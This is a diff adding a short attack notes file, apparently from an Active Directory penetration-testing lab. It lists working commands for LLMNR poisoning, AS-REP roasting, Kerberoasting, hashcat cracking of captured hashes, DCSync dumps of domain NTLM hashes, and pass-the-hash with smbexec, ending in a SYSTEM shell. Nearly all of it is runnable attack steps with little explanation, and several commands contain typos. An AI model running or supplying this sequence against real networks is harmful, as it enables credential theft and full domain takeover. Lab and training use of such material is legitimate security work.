@@ -1,0 +1,32 @@
+ifconfig
+
+LLMNR POISONING
+sudo responder -I eth1 -dPv - //set up a responder to listen for events on the network
+//Capture the hash
+nano aanissa.txt - //save the hash
+hashcat -m 5600 aanissa.txt /usrshare/wordlists/rockyou.txt - //crack the hash - Andriana
+
+ASREPROASTING
+python3 GetNPUsers victim/aanissa:Adriana -request - // Asreproasting for users with pre-auth disabled
+nano user.txt - // save the hash
+hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt - //crack the hash
+
+ATTEMPTED DCSYNCING ATTACK / NTLM HASH DUMP
+python3 secretsdump.py -just-dc user@victim.com - // dump NTLM hash form the NTDS.DIT database
+password
+//failed because we're using a low-privileged user account
+
+KERBEROASTING
+python3 GetUserSPNs.py victim/aanissa:Andriana -dc-ip 192.169.56.120 -request - //kerberoasting for service accounts
+nano service - //save the hash
+hashcat -m 13100 -O service.txt /usr/share/wordlists/rockyou.txt - //crack the hash
+
+DCSYNCING /HASHDUMP
+python3 secretsdump.py -just-dc sqlservice@victim.com -//dump users' NTLM hashes and kerberos keys
+password
+
+PASS THE HASH
+python3 smbexec.py Administartor:@victim.com -hashes lm:nt - // pass in the hash
+// we get a semi interactive shell
+C:\Windows\System32>whoami
+nt authority\system 
